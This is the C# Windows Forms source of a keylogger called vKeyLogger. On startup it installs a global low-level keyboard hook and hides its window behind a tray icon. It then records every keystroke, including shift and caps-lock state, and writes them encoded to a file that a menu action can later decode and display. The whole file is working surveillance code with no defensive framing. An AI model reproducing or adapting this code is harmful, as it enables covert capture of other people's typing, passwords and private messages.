using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using vKeyLogger.APIHandler;
using System.Threading;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using vKeyLogger.Crypto;
using vKeyLogger.Authorise;

namespace vKeyLogger
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            fileEnc = new TextCodec(DateTime.Now);
            trayIcon.Visible = true;
            //Starting the keyboard Hook Procedure
            _proc = this.HookCallback;
            _hookID = SetHook(_proc);
            
        }

        public const int WH_KEYBOARD_LL = 13;
        public const int WM_KEYDOWN = 0x0100;
        private ImportAPI.LowLevelKeyboardProc _proc ;
        private IntPtr _hookID = IntPtr.Zero;
        string keyPressed;
        TextCodec fileEnc;

        protected override void OnShown(EventArgs e)
        {
            base.OnShown(e);
            this.Hide();
        }

        private IntPtr SetHook(ImportAPI.LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return ImportAPI.SetWindowsHookEx(WH_KEYBOARD_LL, proc, ImportAPI.GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private void exitVKeyLoggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        public IntPtr HookCallback(
        int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int param = 0; int param1 = 0;
                int vkCode = Marshal.ReadInt32(lParam);

                //Check for shift Key Press
                short val1 = ImportAPI.GetKeyState(160);
                bool check1 = Convert.ToBoolean(val1 & 0x8000);

                short val2 = ImportAPI.GetKeyState(160);
                bool check2 = Convert.ToBoolean(val2 & 0x8000);

                if (check1 || check2)
                    param = 1;

                //Check for CapsLock Press
                val1 = ImportAPI.GetKeyState(20);
                check1 = Convert.ToBoolean(val1 & 0x1);

                if (check1)
                    param1 = 1;
               
                keyPressed = FuncLib.getCode(vkCode, param, param1);
                this.fileEnc.EncodeToFile(keyPressed);
                label1.Text += keyPressed;                
            }
            return ImportAPI.CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);
            ImportAPI.UnhookWindowsHookEx(_hookID);
            trayIcon.Visible = false;
        }

        private void showVKeyLoggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.Opacity = 100;
            this.Show();
        }

        private void hideVKeyLoggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {
            string decdata = "";
            decdata = this.fileEnc.DecodeFromFile(fileEnc.FileName);
            label1.Text = "";
            label1.Text = "Decoded Text: ";
            label1.Text += decdata;
        }
    }
}
